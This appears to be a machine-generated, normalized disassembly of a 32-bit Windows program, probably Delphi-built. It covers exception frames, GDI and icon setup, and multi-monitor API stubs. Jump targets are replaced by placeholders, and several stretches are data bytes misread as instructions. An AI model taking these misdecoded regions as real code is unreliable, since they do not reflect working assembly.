mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42229a
mov eax [ ebp - 0x4 ]
call sub_422088
retn
mov esp ebp
pop ebp
retn
sub_42229a
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4030f0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42207c
xor eax eax
push ebp
push sub_422293
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42229a
mov eax [ ebp - 0x4 ]
call sub_422088
retn
mov esp ebp
pop ebp
retn
sub_4222c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c698
push eax
mov eax ebx
call sub_41c698
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_422094
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4222f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4223c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223c8
retn
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
call sub_41f410
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404928
sub_4223cc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_421ed0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_421f4c
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41bddc ]
call sub_41be50
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41bddc ]
call sub_41be50
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41bddc ]
call sub_41be50
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422018
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov ecx sub_41c6a8
mov edx sub_41c6b8
mov eax [ sub_41b118 ]
call sub_413228
mov ecx r-xdata
mov edx sub_41c8c0
mov eax [ r-xdata ]
call sub_413228
sub_4224d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4224fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422504
retn
sub_422514
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
and eax 0x140042
add [ eax ] al
in al 0x13
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x67ffbec8 ] cl
inc edx
add [ eax ] bh
aaa
inc ecx
add [ edi + esi + 0x540b0041 ] dh
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi ] ah
inc edx
les esp [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ 0x80042 ] 0x1
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x27200040 ] ah
inc edx
add [ ecx + ebp ] ch
inc eax
add [ edi + 0x42 ] ah
add [ eax + 0x27 ] dl
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413ac8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax + 0x25 ] bh
inc edx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x27200040 ] ah
inc edx
add [ edi + 0x27640042 ] al
inc edx
add [ eax + 0x27 ] dl
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x2c00408d
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc edx
mov eax edi
call sub_4030f0
sub_422640
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_422698
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413ac8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4030f0
sub_4226dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_422720
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_422764
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413750
mov eax esi
pop esi
pop ebx
retn
sub_422790
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4227b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227bc
retn
sub_422884
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4228a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228b0
retn
sub_4228bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_42297b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422982
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4228bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eac
sub_4229a4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4228bc
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_422a2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4228bc
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_422abc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4228bc
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_422a2c
sub_422b52
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4228bc
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_422bd3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4228bc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422cc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4228bc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422d94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4228bc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422e68
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4228bc
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_423003
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_423029
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423030
retn
sub_423044
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423069
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423070
retn
sub_4230e8
in al dx
xor [ edx ] al
movups [ ecx + 0x43 ] xmm1
adc eax 0x65705349
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
inc edx
xor [ edx ] al
add [ esi - 0x6d ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi ] ah
inc edx
add [ eax + eax ] cl
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
inc edx
outsb
dec eax
insb
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
push esi
je r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
jae r-xdata
xor [ edx ] eax
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
xor al [ edx ]
or al 0x0
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x30e87265
inc edx
add [ ecx ] al
xchg bx ax
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x4231a4c0 ]
add al al
dec edi
jae r-xdata
jo r-xdata
insb
je r-xdata
outsb
je r-xdata
or [ eax + 0x65 ] ecx
insb
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
xor [ edx ] eax
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
add bh bh
jmp [ ecx + esi + 0x42 ]
adc ecx [ ecx + 0x45 ]
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
outsb
je r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x8800408d
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc004232 ] bl
add [ eax ] al
dec ecx
imul esp [ ebp + 0x77 ] 0x31247265
inc edx
add [ ecx ] al
xchg bx ax
cld
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x423128c0 ]
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
xor [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0xc004232 0x0
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
jae r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f00
lea eax [ eax ]
and al 0x32
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x32240040 ]
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
jmp r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423070
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404928
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
inc ebx
xor edi edi
outsd
outsb
je r-xdata
jne r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
add bh bh
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
jae r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42267c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405500
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
dec [ ebx + 0x4230b8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_423440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4234b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4235cc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405500
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4234bd
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_423558
mov [ rw-data ] eax
sub_4234c4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423558
mov [ rw-data ] eax
mov ecx r-xdata
call sub_40552c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42351c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405500
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_423558
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_422640
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422640
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422640
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403eac
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4235cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4236cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
